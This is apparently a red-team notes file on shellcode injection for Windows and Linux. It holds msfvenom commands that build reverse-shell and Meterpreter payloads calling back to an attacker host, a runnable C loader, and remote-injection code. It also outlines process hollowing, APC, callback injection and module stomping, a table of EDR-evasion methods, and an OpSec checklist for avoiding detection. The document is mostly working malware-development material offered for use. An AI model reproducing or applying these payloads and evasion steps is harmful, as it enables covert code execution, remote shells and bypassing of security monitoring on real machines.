---
tags:
  - redteam
  - shellcode
  - injection
  - malware-dev
created: 2026-08-29
status: complete
---

# 💉 Shellcode Injection Techniques

> [!abstract] TL;DR
> Inject = allocate memory in a process → write shellcode → redirect execution.
> Classic APIs are hooked by EDR — know the alternatives.

---

## 1. Shellcode Sources

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=443 -f c -o sh.c
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f raw -o sh.bin
# bad-char avoidance for specific injection contexts:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -b '\x00' -f c
```

Test harness before deploying:

```c
// C loader — local injection, for testing shellcode only
unsigned char buf[] = "\xfc\x48...";
int main() {
    void *m = VirtualAlloc(0, sizeof buf, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(m, buf, sizeof buf);
    ((void(*)())m)();
}
// cl.exe /W0 loader.c /Fe:t.exe   (MSVC)  or use mingw: x86_64-w64-mingw32-gcc -o t.exe loader.c
```

---

## 2. Injection Patterns

### 2.1 Local (self) injection
`VirtualAlloc` → `memcpy` → `CreateThread`. Simplest; RWX memory in your own
process is a red flag → use `PAGE_READWRITE` then `VirtualProtect` to `RX`.

### 2.2 Classic remote (CreateRemoteThread)
```c
HANDLE p = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
LPVOID m = VirtualAllocEx(p, NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(p, m, buf, len, NULL);
CreateRemoteThread(p, NULL, 0, (LPTHREAD_START_ROUTINE)m, NULL, 0, NULL);
```

### 2.3 Process hollowing (RunPE)
```text
CreateProcess(suspended) → NtUnmapViewOfSection(legit image) →
VirtualAllocEx(new image base) → WriteProcessMemory(pe headers+sections) →
SetThreadContext(ENTRYPOINT) → ResumeThread
```

### 2.4 Thread hijacking
```text
OpenThread(existing thread) → SuspendThread → GetThreadContext →
redirect RIP to shellcode → SetThreadContext → ResumeThread
```

### 2.5 APC injection
```text
QueueUserAPC(shellcode_addr, thread_handle, NULL) on an alertable suspended
thread — spawn process suspended, queue APC to main thread, resume.
```

### 2.6 Callback-based (no thread APIs)
```text
EnumFonts/EnumSystemLocales/CertEnumSystemStore/TrackPopupMenu — pass
shellcode address as callback pointer. Defeats CreateRemoteThread alerts.
```

### 2.7 Module stomping
```text
Load a legit DLL into the target, overwrite its .text with shellcode.
RX memory in a mapped module = looks normal to memory scanners.
```

### 2.8 DLL injection (classic variant)
```text
VirtualAllocEx(path string) → WriteProcessMemory → CreateRemoteThread(LoadLibraryA)
```

---

## 3. EDR-Aware Variants

| Technique | Avoids | Tooling |
|---|---|---|
| Direct syscalls | ntdll hooks | SysWhispers3, HellsGate/HalosGate |
| D/Invoke | hooking + IAT detection | SharpDInvoke |
| Unhooking | per-function patches | map fresh ntdll from disk KnownDlls |
| Spoofed PPID | parent-child alerts | PROC_THREAD_ATTRIBUTE_PARENT_PROCESS |
| BlockDLLs policy | injection into monitored procs | PROCESS_CREATION_MITIGATION_POLICY |

> [!tip] OpSec checklist
> - RX-only after write (no long-lived RWX)
> - Inject into a sacrificial/legit process, not your loader's own
> - Randomize: process names, sleep intervals (with jitter), memory encryption while sleeping (e.g. sleep-mask/FOLIAGE concept)
> - Don't `WriteProcessMemory` into `lsass`/`csrss`/`winlogon` — always monitored

---

## 4. Linux Injection (quicker note)

```bash
# ptrace-based (gdb / process_vm_writev)
gdb -p <pid>
call (void*)mmap(0, 4096, 7, 0x22, -1, 0)     # RWX in target
# write bytes to returned addr via /proc/pid/mem, then hijack RIP or hijack a thread

# LD_PRELOAD for new processes:
LD_PRELOAD=/opt/evil.so ./victim

# python ctypes injection skeleton for local:
python3 -c "import ctypes; buf=ctypes.create_string_buffer(open('sh.bin','rb').read()); ctypes.memmove(...)  # see full scripts in engagement notes"
```

Related: [[AV Evasion]] · [[msfvenom — Payload Generation Guide]] · [[Meterpreter]] · [[DLL Hijacking]]